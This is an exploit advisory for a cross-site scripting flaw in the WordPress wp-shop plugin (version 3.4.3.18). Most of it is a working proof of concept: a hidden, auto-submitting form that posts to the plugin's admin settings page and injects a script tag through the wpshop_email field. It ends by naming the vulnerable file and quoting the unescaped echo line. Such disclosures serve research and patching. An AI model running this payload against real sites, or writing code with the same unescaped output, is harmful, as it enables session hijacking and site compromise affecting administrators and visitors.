# Exploit Title: Wordpress wp-shop Cross Site Scripting
# Exploit Author: Ashiyane Digital security Team
# Vendor Homepage: https://wordpress.org/plugins/wp-shop-original/
# Software Link: https://downloads.wordpress.org/plugin/wp-shop-original.zip
# Version: 3.4.3.18
# Date: 2015/9/14
# Tested on: windows 7 /FireFox
####################################################
#Exploit :
<form name="xss" Method="POST"  
Action="http://localhost/wordpress/wp-admin/admin.php?page=wpshop_settings">
<input type="HiDden" name="update_wpshop_settings" value="1" />
<input type="hIdden" name="cssfile" value="default.css" />
<input type="HIDDEN" name="cform" value="wpshop-cash" />
<input type="hidden" name="position" value="top" />
<input type="hidden" name="wp-shop_show-cost" value="on" />
<input type="hidden" name="wpshop_show_panel" value="on" />
<input type="hidden" name="wpshop_email"  
value='"><script>alert(/XSS/)</script>' />
<input type="hidden" name="wpshop_google_analytic_cc" value="USD" />
<input type="hidden" name="wpshop_hide_auth" value="none" />
<input type="hidden" name="cartpage_link"  
value="http://localhost/wordpress/?wpshopcarts=vizit&currency=q&noGoodText=q&under_title=&usd=&eur="/>
</form>
<script language="javascript">
setTimeout('xss.submit()', 1);
</script>

####################################################################
# Vulnerable File :
/wp-content/plugins/wp-shop-original/views/admin/settings.php
# Vulnerable code:
         Line 78:
<td><input type="text" name="wpshop_email" id="wpshop_email"
value="<?php  echo $this->email;?>"/></td>

##########################################################
discovered by : Amir.ght(Goldhack)
